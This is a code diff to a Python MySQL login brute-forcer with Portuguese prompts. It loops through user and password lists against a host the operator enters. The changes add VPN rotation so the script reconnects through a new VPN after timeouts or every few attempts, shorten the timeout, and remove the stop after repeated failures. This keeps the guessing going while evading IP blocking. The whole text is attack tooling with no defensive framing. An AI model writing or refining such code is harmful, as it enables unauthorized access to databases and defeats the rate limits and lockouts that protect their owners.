@@ -2,13 +2,14 @@ import pexpect
 import random
 import passwords
 import time
-import vpn
+import vpn_vibe_coded
 import users
 from pathlib import Path
 
 passwordsl = passwords.load_passwords()
 usersl = users.load_users()
-openvpn_enter = vpn.openvpn_enter_()
+
+openvpn_enter = vpn_vibe_coded.openvpn_enter_()
 
 finded = False
 
@@ -21,7 +22,13 @@ ERROR_1698 = 5
 ERROR_1045 = 6
 END = 7
 TIMEOUT = 8
-MYSQL_TIMEOUT = 30
+MYSQL_TIMEOUT = 15
+
+
+def reconnect_vpn(current_connection=None):
+    if current_connection is not None and current_connection.isalive():
+        current_connection.close(force=True)
+    return vpn_vibe_coded.openvpn_enter_()
 
 
 def update_status(line_number, value):
@@ -50,7 +57,10 @@ i = int(input("Qual o valor inicial do usuário: "))
 j = int(input("Qual o valor inicial da senha: "))
 
 host = input("Qual o destino: ")
-port = input("Qual a porta: ")
+port = input("Qual a porta (padrão: 3306): ")
+update_status(7, host)
+
+vpn_vibe_coded.prepare_vpn_configs()
 
 next_ = random.randint(30, 45)
 next5 = 5
@@ -138,28 +148,28 @@ while i < len(usersl):
         if result in (END, TIMEOUT):
             tries_exceeded += 1
 
-            if tries_exceeded >= 15:
-                update_status(4, "Muitas tentativas falhadas. Arquivo encerrado")
+            if tries_exceeded >= 10:
+                print("Muitas tentativas falhadas. Trocando de VPN...")
+                update_status(4, "Trocando de VPN...")
 
-                print("Muitas tentativas falhadas. Encerrando...")
                 process.close()
-                break
+                openvpn_enter = reconnect_vpn(openvpn_enter)
 
-            process.close()
-            continue
+                update_status(4, "VPN trocada")
+
+            else:
+                process.close()
+                continue
 
         tries_exceeded = 0
         process.close()
         
         if j >= next5:
-            openvpn_enter.close()
-            openvpn_enter = vpn.openvpn_enter_()
+            openvpn_enter = reconnect_vpn(openvpn_enter)
             next5 += 5
-
-        j += 1
-
-    if tries_exceeded >= 15:
-        break
+        
+        if result not in (END, TIMEOUT):
+            j += 1
 
     if finded == True:
         break
@@ -167,7 +177,10 @@ while i < len(usersl):
     i += 1
     j = 0
 
-if not finded and tries_exceeded < 15:
+    next5 = 5
+
+if not finded and tries_exceeded < 10:
     update_status(4, "Nenhuma combinação encontrada")
 
-openvpn_enter.close()
+if openvpn_enter.isalive():
+    openvpn_enter.close(force=True)
